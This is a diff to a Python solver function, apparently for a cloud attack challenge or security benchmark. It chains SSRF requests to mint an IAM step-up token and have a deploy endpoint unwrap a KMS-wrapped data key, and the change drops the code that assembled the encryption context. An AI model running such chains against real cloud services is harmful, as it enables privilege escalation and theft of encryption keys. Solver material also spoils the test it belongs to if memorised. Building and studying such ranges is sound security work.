@@ -209,18 +209,7 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     wrapped = readresp["workload_output"]["wrapped_data_key"]
     # hop 5c: the KMS unwrap needs a DISTINCT step-up identity (not infra-admin) — mint it, pass it through
     stepup = ssrf(f"{IAM}/iam/stepup?p={b64u({'session': sess1})}")["stepup_token"]
-    # kms_ctx lever: if /iam/describe advertises a KMS grant that constrains EncryptionContextEquals,
-    # assemble the required context from cross-hop state (project = tag_value; environment = env_value
-    # from the winning project record). Absent kms_policy = baseline; no context passed.
-    unwrap_req = {**base_req, "action": act_unwrap, "input": wrapped, "stepup": stepup}
-    _kms_policy = desc.get("kms_policy") or {}
-    _required_ctx_keys = ((_kms_policy.get("grant_constraints") or {})
-                          .get("EncryptionContextEquals") or {}).get("required_keys") or []
-    if _required_ctx_keys:
-        # values come from earlier hops — the KMS policy documents WHERE they come from, not what they are.
-        _ctx_source = {"project": tag_value, "environment": winning.get("environment")}
-        unwrap_req["encryption_context"] = {k: _ctx_source[k] for k in _required_ctx_keys if k in _ctx_source}
-    unwrapresp = ssrf(f"{DEP}/deploy/run?p={b64u(unwrap_req)}")
+    unwrapresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_unwrap, 'input': wrapped, 'stepup': stepup})}")
     marker(unwrapresp)  # h5b step-up / KMS-unwrap marker (cloudapp)
     dk = bytes.fromhex(unwrapresp["workload_output"]["data_key"])
     st.update(blob=blob, stepup=stepup, data_key=dk.hex())
